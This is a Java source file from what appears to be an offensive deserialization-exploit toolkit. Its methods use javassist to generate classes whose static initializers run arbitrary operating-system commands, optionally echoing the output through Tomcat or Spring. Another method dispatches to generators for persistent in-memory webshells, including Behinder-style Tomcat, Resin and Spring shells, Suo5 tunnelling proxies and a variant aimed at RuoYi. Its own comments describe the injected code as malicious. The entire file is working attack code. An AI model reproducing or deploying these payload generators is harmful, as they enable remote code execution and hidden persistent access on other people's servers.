package com.mechoy.utils;

import com.mechoy.bean.YsoGadgetBean;
import com.mechoy.memshell.resin.ResinListenerBehinder;
import com.mechoy.memshell.resin.ResinListenerCMD;
import com.mechoy.memshell.spring.RuoYiSpringInterceptorBehinder;
import com.mechoy.memshell.spring.SpringInterceptorBehinder;
import com.mechoy.memshell.suo5.Suo5SpringInterceptorProxy;
import com.mechoy.memshell.suo5.Suo5TomcatFilterProxy;
import com.mechoy.memshell.tomcat.TomcatListenerBehinder;
import com.mechoy.memshell.tomcat.TomcatListenerCMD;
import javassist.ClassPool;
import javassist.CtClass;

import java.util.UUID;

public class ClassUtils {

    public static byte[] generateCommandClass(String common, String echoType) throws Exception {
        //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
        UUID uuid = UUID.randomUUID();
        String replace = uuid.toString().replace("-", "");

        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass("A" + replace);

        String cmd = "";
        if (echoType.equals("NoFeedback")) {
            cmd = "Runtime.getRuntime().exec(new String[]{" + cmdTo(common.split(" ")) + "});";
            //向静态代码块插入恶意代码，插入到构造函数也可以
            cc.makeClassInitializer().insertBefore(cmd);
        } else {
            // 对于回显方式不是null的，先执行命令，再进行回显
            cmd = "java.lang.StringBuilder output = new java.lang.StringBuilder();\n" +
                    "try {\n" +
                    "   java.lang.Process exec = Runtime.getRuntime().exec(new String[]{" + cmdTo(common.split(" ")) + "});\n" +
                    "   java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(exec.getInputStream()));\n" +
                    "   String line;\n" +
                    "   while ((line = reader.readLine()) != null) {\n" +
                    "       output.append(line).append(\"\\n\");\n" +
                    "   }\n" +
                    "   int exitCode = exec.waitFor();\n" +
                    "}catch (Exception e){\n" +
                    "   e.printStackTrace();\n" +
                    "}\n";
            //向静态代码块插入恶意代码，插入到构造函数也可以


            switch (echoType) {
                case "TomcatEcho":
                    EchoUtils.tomcatEcho(cc, cmd);
                    break;
                case "SpringEcho":
                    EchoUtils.springEcho(cc, cmd);
                    break;
            }
        }

        // 后续可以增加实现类

        return cc.toBytecode();
    }

    public static byte[] generateMemShell(YsoGadgetBean ysoGadgetBean) throws Exception {
        byte[] evilbytes = null;

        switch (ysoGadgetBean.getMemShellType()) {
            case "TomcatListenerCMD":
                evilbytes = TomcatListenerCMD.generateListenerMemShell(ysoGadgetBean.getMemShellPass());
                break;
            case "TomcatListenerBehinder":
                evilbytes = TomcatListenerBehinder.generateListenerMemShell(ysoGadgetBean.getMemShellPass());
                break;
            case "SpringInterceptorBehinder":
                evilbytes = SpringInterceptorBehinder.generateListenerMemShell(ysoGadgetBean.getMenShellPath(), ysoGadgetBean.getMemShellPass());
                break;
            case "ResinListenerCMD":
                evilbytes = ResinListenerCMD.generateListenerMemShell(ysoGadgetBean.getMemShellPass());
                break;
            case "ResinListenerBehinder":
                evilbytes = ResinListenerBehinder.generateListenerMemShell(ysoGadgetBean.getMemShellPass());
                break;
            case "Suo5SpringInterceptorProxy":
                evilbytes = Suo5SpringInterceptorProxy.generateListenerMemShell(ysoGadgetBean.getMenShellPath(), ysoGadgetBean.getMemShellHeaderKey(), ysoGadgetBean.getMemShellHeaderValue());
                break;
            case "Suo5TomcatFilterProxy":
                evilbytes = Suo5TomcatFilterProxy.generateListenerMemShell(ysoGadgetBean.getMenShellPath(), ysoGadgetBean.getMemShellHeaderKey(), ysoGadgetBean.getMemShellHeaderValue());
                break;
            case "RuoYiSpringInterceptorBehinder":
                // 针对若依(springboot+springShiro这种类型的内存马)
                evilbytes = RuoYiSpringInterceptorBehinder.generateListenerMemShell(ysoGadgetBean.getMenShellPath(), ysoGadgetBean.getMemShellPass());
                break;
        }
        return evilbytes;
    }

    private static String cmdTo(String[] split) {
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < split.length; i++) {
            stringBuilder.append("\"");
            stringBuilder.append(split[i]);
            stringBuilder.append("\"");
            if (i == split.length - 1) {
                break;
            }
            stringBuilder.append(",");
        }

        return stringBuilder.toString();
    }
}
